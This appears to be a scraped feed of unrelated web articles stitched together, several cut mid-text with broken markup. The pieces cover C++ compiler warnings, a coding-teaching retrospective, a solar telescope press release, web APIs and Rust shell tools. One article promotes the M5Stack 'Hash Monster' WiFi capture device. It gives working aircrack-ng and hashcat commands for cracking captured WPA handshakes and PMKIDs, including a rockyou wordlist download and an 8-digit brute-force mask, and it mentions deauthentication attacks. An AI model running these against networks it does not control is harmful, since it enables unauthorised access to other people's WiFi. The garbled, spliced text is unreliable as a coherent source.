<p>The extra pair of parentheses is what I’m calling a “suppression mechanism.”
It’s just an arbitrary way of silencing a warning diagnostic — telling the compiler
“no, I really <em>meant</em> to write this legal but unusual construct.”</p>

<p>Another well-known suppression mechanism is writing <code>(void)</code> in front of unused results
to silence <code>-Wunused-value</code> and <code>-Wunused-result</code> warnings (<a href="https://godbolt.org/z/WdrhrE">Godbolt</a>):</p>

<div><div><pre><code>[[nodiscard]] int foo();
void test(int x) {
    (void)x;
    (void)foo();
}
</code></pre></div></div>

<p>And a trivial suppression mechanism is implied by the name of the <code>-Wparentheses</code> warning:</p>

<div><div><pre><code>warning: '&amp;&amp;' within '||' [-Wlogical-op-parentheses]
    return (a &amp;&amp; b || c);
            ~~^~~~ ~~
</code></pre></div></div>

<p>Here the compiler just wants you to add a pair of parentheses to clarify the precedence for the reader.</p>

<h2 id="musing-a-single-fixit-must-preserve-actual-behavior-or-likely-intent-but-cant-do-both">Musing: A single fixit must preserve (actual) behavior or (likely) intent, but can’t do both</h2>

<p>It’s easy for the programmer to “fix” diagnostics like <code>-Wunused-result</code> and <code>-Wlogical-op-parentheses</code>,
because they’re just asking the programmer to clarify intent that is already pretty clear:
<em>Yes</em>, I mean to discard this result. <em>Yes</em>, I mean to evaluate <code>(a &amp;&amp; b) || c</code>.</p>

<p>The more interesting diagnostics are the ones where the compiler believes it has identified a mismatch
between the code’s actual <em>behavior</em> and the programmer’s <em>intent</em>. Our <code>if (argc = 1)</code> example
above was like that. A more realistic example might be something like</p>



<p>Here it is almost certain that the programmer intended to write</p>



<p>However, the literal behavior of the code as written is equivalent to</p>



<p>When the compiler suggests a fixit for this warning, it has to choose: Should we suggest the fix
that changes the behavior of the code to what you probably meant to type — the “spellcheck” option?
Or should we show how to silence the warning while preserving the existing code’s behavior — the
“Add To Dictionary” option, if you will? (Or, continuing our medical analogy, there’s the “treatment”
option and the “<a href="https://en.wikipedia.org/wiki/Do_not_resuscitate">DNR</a>” option.)</p>

<p>Showing just the “treatment” option puts the compiler in the awkward position of “recommending” that you change
the behavior of code that is, after all, perfectly legal C++ already; blindly applying the fixit to
working code might break that code. But showing just the “suppression” option might encourage a programmer to
blindly apply the fixit to <em>broken</em> code, thus leaving the bug in place but making it harder to detect
in the future.</p>

<p>For certain kinds of warnings, Clang shows <em>both</em> fixits. Two examples of this in Clang 10
are (<a href="https://godbolt.org/z/aWf9s6">Godbolt</a>):</p>

<div><div><pre><code>warning: using the result of an assignment as a condition without parentheses [-Wparentheses]
    if (x = foo())
        ~~^~~~~~~
note: place parentheses around the assignment to silence this warning
    if (x = foo())
          ^
        (        )
note: use '==' to turn this assignment into an equality comparison
     if (x = foo())
          ^
          ==
</code></pre></div></div>

<p>and</p>

<div><div><pre><code>warning: &amp; has lower precedence than !=; != will be evaluated first [-Wparentheses]
    return (foo() &amp; mask != 0);
                  ^~~~~~~~~~~
note: place parentheses around the '!=' expression to silence this warning
    return (foo() &amp; mask != 0);
                  ^
                    (        )
note: place parentheses around the &amp; expression to evaluate it first
    return (foo() &amp; mask != 0);
                  ^
            (           )
</code></pre></div></div>

<p>Notice that in both cases, Clang decides to print the “suppression” option first
and the “treatment” option second.
But sometimes Clang prints the “treatment” option first and the “suppression” option second:</p>

<div><div><pre><code>warning: size argument in 'strncmp' call is a comparison [-Wmemsize-comparison]
    return strncmp(a, b, len &lt; 0);
                         ~~~~^~~

<p>Of course, there are many more cases where Clang emits <em>only</em> the “suppression” option
as a fixit, leaving the programmer to figure out the “treatment” on their own. (GCC 10.2
emits a fixit for only the last of these four examples; and it’s the “suppression” option.)</p>

<p>Even in the absence of any machine-readable fixits, the phrasing of the warning message
itself can induce the human reader to think in terms of suppression or in
terms of treatment. A warning message can be phrased as “Please confirm that you meant X”;
or “You did X; did you mean Y?”; or even as “Your attempt to do Y failed.”</p>

<h2 id="musing-suppression-mechanisms-are-about-edit-distance-and-about-signaling">Musing: Suppression mechanisms are about edit distance, and about signaling</h2>

<p>Compiler warnings of the kind we’re discussing here are basically of the form
“You wrote X, but I think you meant Y.” This happens only when X and Y are
in some sense <em>close together</em>. Sometimes the “closeness” is semantic, not syntactic
(as when the programmer means to invoke copy elision but writes <code>return std::move(x)</code> instead).
But for our purposes today, let’s just think about <em>syntactic</em> closeness. You meant
to write Y, but a minor typographical slip caused you to write X. In the examples above,
the slips are things like “omit one <code>=</code>,” or “omit a pair of parens” or
“put <code>&lt; 0</code> inside the parens instead of outside.”</p>

<p>Take X=”equality-compare <code>!a</code> to <code>b</code>” and Y=”negate the sense of <code>a == b</code>.”
There are some pieces of code that clearly intend to express X, such as <code>(!a)==(b)</code>.
There are some that clearly intend to express Y, such as <code>a != b</code>.
But you wrote <code>(!a==b)</code>, which falls into a gray area: it’s not clear which of
X and Y you really intended to express.</p>

<p>The job of the compiler-diagnostic-developer is to create some separation between
the space of inputs that the compiler considers “clearly X”
and the space of inputs that the compiler considers “clearly Y.”
Essentially, we create an error-correcting code by deliberately increasing the
<a href="https://en.wikipedia.org/wiki/Hamming_distance">edit distance</a>
between pairs of inequivalent C++ programs — deliberately increasing the number of keystrokes
the programmer would have to screw up in order to transform a working (and warning-free)
C++ program into an inequivalent broken (yet warning-free) C++ program.</p>

<p>Furthermore, in cases where Y is more commonly intended than X, it should be relatively <em>easier</em>
to write Y than X. In our example that’s true even at the core-language level: <code>a != b</code> is
already easier to write than <code>!a == b</code>. But when we increase the distance between X-space and Y-space,
we shrink X-space by more than we shrink Y-space. If you really intend to express <code>!a == b</code>, we’ll force you
to retreat all the way to <code>(!a) == b</code>. This is kind of analogous to the
<a href="https://en.wikipedia.org/wiki/Signalling_(economics)">signaling principle</a>
in economics or evolutionary biology: Basically, if you want the compiler to accept your intent,
your code must adopt some cumbersome and frankly maladaptive ornamentation in order to <em>prove</em>
its worthiness to the compiler.</p>

<p>According to the prevailing theory of
<a href="https://en.wikipedia.org/wiki/Handicap_principle">sexual selection in the animal kingdom</a>,
when a peahen is deciding whether to accept
a particular peacock, she uses …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1599018800430/t5WB9APqY.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>For the past 3 months, I've worked with a team of 4 people to design a curriculum to help 300 middle schoolers start their coding journey. Most of them had little to no experience with programming.</p>
<h2 id="we-knew-this-was-going-to-be-a-challenging-task-but-we-were-certain-we-could-do-it">We knew this was going to be a challenging task, but we were certain we could do it.</h2>
<p>That is why we decided to teach them in a way which most programmers learn:</p>
<ol>
<li>The students would daily watch a video tutorial and follow instructions in it</li>
<li>They would then solve challenges curated by our team</li>
<li>Every weekend a doubt solving session was held wherein the concepts were quickly brushed upon and you guessed it, doubts were cleared</li>
</ol>
<p>Now here are my main takeaways:</p>
<h2 id="1-teaching-takes-patience-a-lot-of-patience">1. Teaching takes patience, A LOT OF PATIENCE!</h2>
<p>Especially younger students require spoon-feeding at times.
Resources which were given to them had to be boiled down enough for them to grasp it. </p>
<h2 id="2-having-clear-fundamentals-is-very-important">2. Having clear fundamentals is very important.</h2>
<p>Basic things like knowing what is an integer, string, variable etc. are very important, otherwise programming at a later stage becomes very difficult. </p>
<h2 id="3-you-must-keep-your-expectations-low-dont-expect-to-make-aaa-games-after-just-a-month-of-programming">3. You must keep your expectations low: Don't expect to make AAA games after just a month of programming.</h2>
<p>To put it bluntly, programming is very very tough.
Takes months of learning to get good at it and there is always something new to learn. </p>
<h2 id="4-having-smaller-more-achievable-goals-helps-in-learning-things-faster">4. Having smaller more achievable goals helps in learning things faster.</h2>
<p>This also makes you more confident. </p>
<h2 id="5-teach-your-students-how-to-ask-doubts-and-google-things">5. Teach your students how to ask doubts and google things</h2>
<p>Before asking doubts one must give a detailed explanation as to what they have tried and have they tried searching it up on the web?Bugs are inevitable and a coder must learn to google stuff when things don't work out </p>
<h2 id="conclusion">Conclusion</h2>
<p>All went well and in the end we were able to help all the students to get a feel for what programming feels, our goal was not make full-stack 12-year-old prodigies who work at Facebook but to get them excited about programming and I feel we achieved our goal very well.</p>
<p>Hope you found this post insightful.
Have an awesome day, Cheers.</p>

ESP32 is a series of dual-core up to 240Mhz, low-cost, low-power system on a chip microcontroller with integrated Wi-Fi and dual-mode Bluetooth/BLE.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/ac7ba2d12ae49bb808d323edae91463b7f97656872f7d24c91dab86d4ba1653d.jpeg"></p><p>Pwnagotchi is a tamagochi like device powered by bettercap and running on a Raspberry Pi Zero W that learns from its surrounding WiFi environment in order to maximize the crackable WPA key material it captures (either through passive sniffing or by performing deauthentication and association attacks). This material is collected on disk as PCAP files containing any form of handshake supported by hashcat, including full and half WPA handshakes as well as PMKIDs. Or put quickly, it's a tamagochi who eats WiFi handshakes to be happy.</p><p>Hash Monster runs in a smaller size and cheaper platform superior to the Pwnagotchi in several aspects. While Pwnagotchi is based on the Raspberry Pi Zero and requires assembling a DIY kit with various components such as an eInk screen and an external powerbank, the Hash Monster works on directly on the tiny M5Stack device. M5 Stack couples an ESP32 with a small LCD display, buttons and internal battery. It’s a modular, stackable, scalable, and portable device which is powered with an ESP-32 core, which makes it open source, low cost, full-function, and easy for developers to handle ESP32 IoT product development. You can program M5Stack through Arduino, C++, Blockly or MicroPython to name a few. The complete development kit for M5 Stack just under $45 provides a friendly price and full-featured resources which makes it a good starter kit for you to explore ESP32. While the M5 Stack includes a built-in battery 110mAh, it can be upgraded with a stackable 700 mAh lipo battery extension module.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/615059260bcadb5085e71de543154bec6c52222f5d1efda91cdcafdbe403cce2.png"></p><p>The similarity between Pwnagotchi and Hash Monster is that they capture both PSK handshakes from WPA / WPA2 networks and PSK hashes contained in beacon frames with PMKID. A great advantage of PMKID cracking is that everything you need is available over the air even if there are no stations connected and only a single packet capture is required. Later we can crack these hashes with standard tools such as aircrack or hashcat, and thus obtain the credentials. Of course, we should only do this in networks that we manage ourselves or that we have permission to audit.</p><p><strong>The process.</strong></p><p>Hardware requirements:</p><ul><li><a href="https://bit.ly/3jFAnl8" target="_blank" rel="nofollow noopener">M5Stack CORE Development Kit</a> with built-in 110mAh Battery ($45)</li></ul><p>Optionally:</p><ul><li><a href="https://bit.ly/3gYtI48" target="_blank" rel="nofollow noopener">Extended Battery M5Stack Core Development Kit Capacity 700mAh Stackable Module</a> (USD$12)</li><li><a href="https://www.banggood.com/M5Stack-Multi-function-Digital-Watch-with-700mAh-Battery-for-M5Stack-ESP32-Core-p-1551727.html?rmmds=search&amp;cur_warehouse=CN" target="_blank" rel="nofollow noopener">Smart Watch Module with 700mAh Battery for M5Stack ESP32 Core</a> ($15)</li></ul><p>The software installation is pretty straight forward:</p><p>1.Setup Arduino IDE environment.</p><p><em>M5Stack Arduino IDE Setup in 5 minutes <a href="https://www.youtube.com/watch?v=U2es-l4z2Zg" target="_blank" rel="nofollow noopener">https://www.youtube.com/watch?v=U2es-l4z2Zg</a></em></p><p>2.

We will do this with two known tools – Aircrack-ng and Hashcat, which relies respectively on CPU and GPU power. We will be running these tools from linux, even though they are both found in a Windows version as well. Remember to use recent versions to benefit from the PMKID attack in addition to the traditional cracking of handshakes.</p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/adb3724e47a02d9fe14b83454cae422f882a9c99ccc78f0f2db6ef6e7a7f6f9b.png"></p><p>Aircrack-ng can be used for very basic dictionary attacks running on your CPU. Before you run the attack you need a wordlist. I recommend using the infamous rockyou dictionary file:</p><p># download the 134MB rockyou dictionary file</p><pre><code><code>curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></code></pre><p>Note, that if the network password is not in the wordlist you will not crack the password.</p><p># -a2 specifies WPA2, -b is the BSSID, -w is the wordfile</p><pre><code><code>aircrack-ng -a2 -b AC:FC:E3:C9:AB:C0 -w rockyou.txt 3.cap</code></code></pre><p>If the password is cracked you will see a KEY FOUND! message in the terminal followed by the plain text version of the network password.</p><p>Cracking an WiFi password using brute force attack for a long WiFi password without GPUs or Cloud help, will be a nightmare but if the password is short or you know the key pattern it will be "easily" cracked.</p><p>Here you have a small guide for linux (Ubuntu) to crack the WiFi password using the files stored on the SD_Card of the Purple Hash Monster using your computer.</p><p>First we need to install <strong>hashcat</strong></p><pre><code><code>sudo apt-get update</code><br>
<code> sudo apt install hashcat</code></code></pre><p>EAPOL/PMKID stored on the SD-Card are <em>pcap</em> files, we have to convert to <em>hccapx</em> format to work with hashcat. In terminal from the directory were we have the <em>pcap</em> file from the SD-CARD:</p><pre><code><code>wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c</code><br>
<code> gcc -o cap2hccapx cap2hccapx.c</code><br>
<code> ./cap2hccapx 1.pcap 1.hccapx</code></code></pre><p>For example if we know that the wifi password has a lenght of 8 digits we can run the following command, and in few seconds we will have the WiFi Password :)</p><pre><code><code>hashcat --force -m 2500 -a 3 -1 ?d -o cracked 1.hccapx ?1?1?1?1?1?1?1?1</code></code></pre><p><strong>Final notes</strong></p><p>Although in my case I exclusively use the M5 Stack for the pocket monster hash, there are undoubtedly several projects that run on the M5 Stack and you will certainly want to take a look if you are interested in wifi and bluetooth security attack tools for this platform.</p><p>M5 Stack WiFi SSID Scanner by Elkentaro</p><p><a href="https://github.com/elkentaro/M5_SSID_scanner_collector" target="_blank" rel="nofollow noopener">https://github.com/elkentaro/M5_SSID_scanner_collector</a></p><p>Covid Sniffer: BLE COVID exposure app sniffer using M5 Stack</p><p><a href="https://gitlab.com/mschmidl/covidsniffer" target="_blank" rel="nofollow noopener">https://gitlab.com/mschmidl/covidsniffer</a></p><p><img src="https://telescopecdn.ams3.digitaloceanspaces.com/images/37366466393830322d656263312d343530392d396463372d653761313033646136666237/02ee78aa44062073eb950642e19a44a548daf55d3217643f1a98cc84d37bc7d6.jpeg"></p></article></div>]]>

          <h2>GREGOR, the largest solar telescope in Europe, which is operated by a German consortium and located on Teide Observatory, Spain, has obtained unprecedented images of the fine-structure of the Sun. Following a major redesign of GREGOR’s optics, carried out by a team of scientists and engineers from the Leibniz Institute for Solar Physics (KIS), the Sun can be observed at a higher resolution than before from Europe.</h2>
        </p><div>
        <p>press release, Sep 1, 2020
</p>

<p>The Sun is our star and has a profound influence on our planet, life, and civilization. By studying the magnetism on the Sun, we can understand its influence on Earth and minimize damage of satellites and technological infrastructure. The GREGOR telescope allows scientists to resolve details as small as 50 km on the Sun, which is a tiny fraction of the solar diameter of 1.4 million km. This is as if one saw a needle on a soccer field perfectly sharp from a distance of one kilometer.
</p>


<p>“This was a very exciting, but also extremely challenging project. In only one year we completely redesigned the optics, mechanics, and electronics to achieve the best possible image quality.” said Dr. Lucia Kleint, who led the project and the German solar telescopes on Tenerife. &nbsp;A major technical breakthrough was achieved by the project team in March this year, during the lockdown, when they were stranded at the observatory and set up the optical laboratory from the ground up. Unfortunately, snow storms prevented solar observations. When Spain reopened in July, the team immediately flew back and obtained the highest resolution images of the Sun ever taken by a European telescope.
</p>

<p>Prof. Dr. Svetlana Berdyugina, professor at the Albert-Ludwig University of Freiburg and Director of the Leibniz Institute for Solar Physics (KIS), is very happy about the outstanding results: “The project was rather risky because such telescope upgrades usually take years, but the great team work and meticulous planning have led to this success. Now we have a powerful instrument to solve puzzles on the Sun.” The new optics of the telescope will allow scientists to study magnetic fields, convection, turbulence, solar eruptions, and sunspots in great detail. First light images obtained in July 2020 reveal astonishing details of sunspot evolution and intricate structures in solar plasma. &nbsp;
</p>


<p>Telescope optics are very complex systems of mirrors, lenses, glass cubes, filters and further optical elements. If only one element is not perfect, for example due to fabrication issues, the performance of the whole system suffers. This is similar to wearing glasses with the wrong prescription, resulting in a blurry vision. Unlike for glasses, it is however very challenging to detect which elements in a telescope may be causing issues. The GREGOR team found several of those issues and calculated optics models to solve them. For example, astigmatism is one of such optical problems, which affects 30-60% people’s vision, but also complex telescopes. At GREGOR this was corrected by replacing two elements with so-called off-axis parabolic mirrors, which had to be polished to 6 nm precision, about 1/10000 of the diameter of a hair. Combined with several further enhancements the redesign led to the sharp vision of the telescope. A technical description of the redesign was recently published by the Astronomy &amp; Astrophysics journal in a recent article led by Dr. L. Kleint.
</p>



<p>European researchers have access to observations with the GREGOR telescope through national programs and a program funded by the European commission. New scientific observations are starting in September 2020. 
</p>

<p>Albert-Ludwig University Freiburg founded in 1457 offers undergraduate and graduate studies in all important disciplines today. The Leibniz Institute for Solar Physics (KIS) located in Freiburg is a public foundation and a member of the Leibniz Association. It carries out fundamental research on the Sun and other stars.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><code>API</code> is the acronym for Application Programming Interface which defines interactions between multiple software architecture layers. Programmers carry out complex tasks easily using APIs in software development. Without APIs, a programmer's life would have been miserable with no proper(security, for example) access to data,  knowing unnecessary low level details etc.</p>
<p>When it comes to Web APIs, there are extremely useful  objects, properties and functions available to perform tasks as minor as accessing DOM to as complex as managing audios, videos, graphics, etc. </p>

<p>If you are from the web development background, you are using many of them already. Here is the list of very well known web APIs.</p>
<ul>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">Canvas</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/History_API">History</a> </li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API">Geolocation</a> </li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model">DOM</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Console_API">Console</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API">Drag &amp; Drop API</a></li>
</ul>
<p>In this article, I am going to talk about 10 more web APIs that are not so popular. Lesser popular doesn't mean, they are not useful. You can use them in various use-cases of your project. Please have a look.</p>

<p>If you would like to jump into the source code or see the demonstration immediately, here are the quick links to them:</p>
<blockquote>
<ul>
<li><a target="_blank" href="https://github.com/atapas/demolab/tree/master/code/src/demos/web-apis">Link to the Source Code @GitHub</a></li>
<li><a target="_blank" href="https://demo.greenroots.info/categories/web-apis/">Link to the Web API DemoLab</a></li>
</ul>
</blockquote>
<p>Note: Web APIs are nothing but the interfaces, functions, objects, properties written and exposed using vanilla JavaScript. However the usage of the web APIs is not limited to the vanilla JavaScript based application alone. It is very straightforward to use them with an Angular, React or Vue based applications as well.</p>
<p>All the examples I have used to demonstrate the web apis in this article are written using reactjs. You can find them in the github link mentioned above. Please feel free to fork, change and use!</p>

<p>A big (pain) point about  using a web API is, most of them are not standardized yet. It means, the support for a web API  may differ from one browser vendor to another. For example, You may find an API working with the Chrome browser but, not supported by Firefox or Edge browsers yet.</p>
<p>I would suggest a couple of ways to have a check on this,</p>


<p>Alright, time to get started knowing them. Hope you also find these useful.</p>
<h2 id="1-fullscreen-api">1. 📺 Fullscreen API</h2>
<p>Do you have the need to show any of the DOM elements in full-screen mode? The full-screen use-case is very demanding for gaming applications, online video platforms(like, youtube) etc. </p>
<p>The <code>Fullscreen API</code> provides methods to present a specific Element (and its children) in a full-screen mode. There is a method available to exit full-screen mode once it is no longer needed. Not only that, this API can also help to perform any actions when a DOM element transition into a full-screen mode or comes out of it.</p>
<p>In the example below, my favorite Santa Claus can get into the full-screen mode and come out of it with ease.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598715764074/fR7trCfsA.gif?auto=format,compress&amp;gif-q=60" alt="full_screen.gif"></p>
<p>In the code below, the <code>manageFullScreen()</code> function uses  the <code>requestFullscreen()</code> API on an element which is having an id called, <code>fs_id</code>. </p>
<pre><code><span>const</span> manageFullscreen = () =&gt; {
   <span>document</span>.getElementById(<span>'fs_id'</span>).requestFullscreen();
}
</code></pre>
<p>This element with id, <code>fs_id</code> is a <code>DIV</code> with a child element, i.e, the Santa Clause image.</p>
<pre><code>&lt;div className=<span>"column"</span>&gt;
  <span><span>&lt;<span>div</span> <span>id</span>=<span>"fs_id"</span>&gt;</span>
    <span>&lt;<span>Img</span> <span>fixed</span>=<span>{imageData.image.childImageSharp.fixed}</span> <span>alt</span>=<span>"santa"</span> /&gt;</span>
   <span>&lt;/<span>div</span>&gt;</span>

    <span>&lt;<span>StyledButton</span> 
         <span>onClick</span>=<span>{manageFullscreen}</span>&gt;</span>
            Enter Fullscreen with Santa
    <span>&lt;/<span>StyledButton</span>&gt;</span>
 <span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>You can check if the <code>Fullscreen API</code> is supported by the browser,</p>
<pre><code><span>if</span> (<span>document</span>.fullscreenEnabled) {
   setSupported(<span>true</span>);
} <span>else</span> {
   setSupported(<span>false</span>);
}
</code></pre>
<p>Also watch out for the useful handlers like,</p>
<ul>
<li><code>onfullscreenchange</code>: An event handler for the fullscreenchange event.</li>
<li><code>onfullscreenerror</code>: An event handler for the fullscreenerror event.</li>
</ul>
<p>Direct link to the demo: <a target="_blank" href="https://demo.greenroots.info/web-apis/web-apis-fullscreen/">https://demo.greenroots.info/web-apis/web-apis-fullscreen/</a></p>
<h2 id="2-clipboard-async-api">2. 📋 Clipboard Async API</h2>
<p>What is a clipboard in comuping?</p>
<blockquote>
<p>The clipboard is a buffer that some operating systems provide for short-term storage and transfer within and between application programs.</p>
</blockquote>
<p>There are mainly three operations you can perform with the clipboard. They are, <code>copy</code>, <code>cut</code> and <code>paste</code>. The Clipboard API provides the ability to respond to these three operations. </p>
<p>Interestingly, copying content to the clipboard is open as in, there is no need of a user permission. However, for pasting the content from the clipboard to the user application, the user needs to grant permission for it. It is achieved using another web API called, <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API">Permission API</a></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598716493747/PwPwDDK8Y.png?auto=format&amp;q=60" alt="image.png"></p>
<p>Here is a simple example of the copy-paste operation,</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598716547383/PoXUNZmnr.gif?auto=format,compress&amp;gif-q=60" alt="clip_board.gif"></p>
<p>This is how to check if the feature is supported by the browser,</p>
<pre><code><span>if</span> (navigator.clipboard 
     &amp;&amp; navigator.clipboard.read 
     &amp;&amp; navigator.clipboard.write) {
   setSupported(<span>true</span>);
} <span>else</span> {
   setSupported(<span>false</span>);
}
</code></pre>
<p>Here is the async API function for writing the content to the clipboard,</p>
<pre><code><span>async</span> <span><span>function</span> <span>performCopy</span>(<span>event</span>) </span>{
   event.preventDefault();
   <span>try</span> {
      <span>await</span> navigator.clipboard.writeText(copyText);
      <span>console</span>.log(<span>`<span>${copyText}</span> copied to clipboard`</span>);
   } <span>catch</span> (err) {
      <span>console</span>.error(<span>'Failed to copy: '</span>, err);
   }
}
</code></pre>
<p>The Async API function to read the content from the clipboard and do something with it,</p>
<pre><code><span>async</span> <span><span>function</span> <span>performPaste</span>(<span>event</span>) </span>{
   event.preventDefault();

<p>Note: With the inclusion of the <code>Clipboard Async API</code>, you can get rid of the usage of <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand">document.execCommad()</a> function as it is obsolete now.</p>

<h2 id="3-resize-observer-api">3. 🧐 Resize Observer API</h2>
<p>Do you want to take some actions based on the changes to the content or border box of a DOM element? Are you thinking of writing a handler by yourself? What if I tell you, there is already one provided by the web API implementation?</p>
<p>Here is a story about a dumb button. We use a range slider to resize the button. While the button gets resized, we also want to control the text color, without letting the button know much about it. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717277220/dITL6Nog2.gif?auto=format,compress&amp;gif-q=60" alt="resizer.gif"></p>
<p>First, create a button and specify an id so that, we can access the button later using the id.</p>
<pre><code>&lt;StyledButton id=<span>"dumbBtnId"</span>&gt;
   I am a Dumb Button
&lt;<span>/StyledButton&gt;</span>
</code></pre>
<p>Now we create a slider using the <code>range</code> input type from HTML5. A <code>resize()</code> function is invoked when the slider value changes.</p>
<pre><code>&lt;div&gt;
   <span><span>&lt;<span>input</span> 
         <span>onChange</span>=<span>{(event)</span> =&gt;</span> resize(event)} 
         type="range" 
         min={minRange} 
         max={maxRange} 
         defaultValue={rangeValue} /&gt;
<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>The <code>resize()</code> function simply sets the width of the button as the slider range value so that, it can be resized dynamically.</p>
<pre><code><span>const</span> resize = event =&gt; {
   <span>const</span> value = event.target.valueAsNumber;
   setRangeValue(value);
   <span>let</span> dumbBtn = <span>document</span>.getElementById(<span>'dumbBtnId'</span>);
   dumbBtn.style.width = <span>`<span>${value}</span>px`</span>;
 }
</code></pre>
<p>So far, so good? Now for every range value change, the button gets resized. We have a <code>ResizeObserver</code> observing this change and change the color of the button text.</p>
<pre><code>useEffect(() =&gt; {
   <span>try</span> {
            <span>let</span> dumbBtn = <span>document</span>.getElementById(<span>'dumbBtnId'</span>);
            <span>var</span> resizeObserver = <span>new</span> ResizeObserver(entries =&gt; {
                <span>for</span>(<span>const</span> entry <span>of</span> entries) {
                    
                    
                   entry.target.style.color = <span>'green`;
                }
      });
      resizeObserver.observe(dumbBtn);
   } catch(e) {
            setSupported(false);
            console.log(e);      
   }
}, [rangeValue]);</span>
</code></pre>

<h2 id="4-image-capture-api">4. 📷 Image Capture API</h2>
<p>There are some cool and useful APIs around user media like, audio, video etc. I love the <code>Image Capture API</code> which helps us to capture an image or grab a frame from the video devices(like webcam). Not only that, you can also perform actions on capturing an image or grabbing a frame.</p>
<p>First, get the user media access. In this case we are getting the webcam access.</p>
<pre><code>navigator.mediaDevices.getUserMedia({video: <span>true</span>})
  .then(mediaStream =&gt; {
     <span>document</span>.querySelector(<span>'video'</span>).srcObject = mediaStream;
     <span>const</span> track = mediaStream.getVideoTracks()[<span>0</span>];
     setTrack(track);
  }).catch(error =&gt; {
     <span>console</span>.error(<span>` <span>${error}</span> is not yet supported`</span>);
     setError(error);
});
</code></pre>
<p>Just like the clipboard paste operation, a webcam media access permission has to be granted by the user.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717565379/MCRNY49Tl.png?auto=format&amp;q=60" alt="image.png"></p>
<p>Now Grab a frame and do something. In this example, I am just drawing the frame on a Canvas.</p>
<pre><code><span>const</span> imageCapture = <span>new</span> ImageCapture(track);
    imageCapture.grabFrame()
      .then(imageBitmap =&gt; {
          <span>const</span> canvas = <span>document</span>.querySelector(<span>'#grabFrameCanvas'</span>);
          drawCanvas(canvas, imageBitmap);
    }).catch(error =&gt; {
          <span>console</span>.log(error);
          setError(error);
});
</code></pre>
<p>I can also take a picture and do the similar thing.</p>
<pre><code><span>const</span> imageCapture = <span>new</span> ImageCapture(track);
    imageCapture.takePhoto().then(blob =&gt; createImageBitmap(blob))
      .then(imageBitmap =&gt; {
          <span>const</span> canvas = <span>document</span>.querySelector(<span>'#takePhotoCanvas'</span>);
          drawCanvas(canvas, imageBitmap);
    }).catch(error =&gt; {
          <span>console</span>.log(error);
          setError(error);
});
</code></pre>
<p>To stop the video streaming from the webcam, just call he method <code>stop()</code> on the running video track.</p>
<pre><code><span>const</span> videoOff = () =&gt; {
   track.stop();
 }
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717833234/MPOxVZ92M.png?auto=format&amp;q=60" alt="chrome_Umvi16wUlu.png"></p>
<p>Also watch out for the methods,</p>
<ul>
<li><code>getPhotoCapabilities()</code>: To get the ranges of available configuration options.</li>
<li><code>getPhotoSettings()</code>: To get the current photo configuration settings.</li>
</ul>

<h2 id="5-broadcast-channel-api">5. 📡 Broadcast Channel API</h2>
<p>The <code>Broadcast Channel API</code> allows communication between browsing contexts (windows, tabs, iframes) and workers on the <strong>same origin</strong>. Think of a use-case like, once you logout from an app running in a browser tab, you want to broadcast it to the app instances opened in other tabs of the same browser.</p>

        <p>Shell is the essential tool for every programmer. The more familiar you become with the available tools, the more efficient you can be with using your computer. Here's a list of command-line tools written in Rust that aim to provide modern, often much faster, alternatives to the existing shell commands.</p>
<h2 id="bat"><code>bat</code></h2>
<p><code>bat</code> is a <code>cat</code> clone with syntax highlighting and Git integration that works on Windows, MacOS and Linux. It provides syntax highlighting for many file extensions by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223573-9b9eb780-de0e-11ea-94e3-908957fe5a4e.png" alt="bat"></p>
<p><a href="https://github.com/sharkdp/bat">GitHub</a></p>
<h2 id="exa"><code>exa</code></h2>
<p><code>exa</code> is a modern replacement for <code>ls</code>, the default command-line program in Unix/Linux for listing directory contents. <code>exa</code> supports icons with the <code>--icons</code> flag.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223612-aa856a00-de0e-11ea-8cec-133becefa6f2.png" alt="exa">
<a href="https://github.com/ogham/exa">GitHub</a></p>
<h2 id="fd"><code>fd</code></h2>
<p><code>fd</code> is a fast and user-friendly alternative to <code>find</code>, the built-in command-line program in Unix/Linux for walking a file hierarchy. <code>fd</code> provides opinionated defaults for the most common use cases. To find a specific file by name, you write <code>fd PATTERN</code> instead of <code>find -iname ‘*PATTERN*’</code>. <code>fd</code> is also extremely fast and it comes with a ton of options like ignoring hidden directories, files and patterns from <code>.gitignore</code> by default.</p>
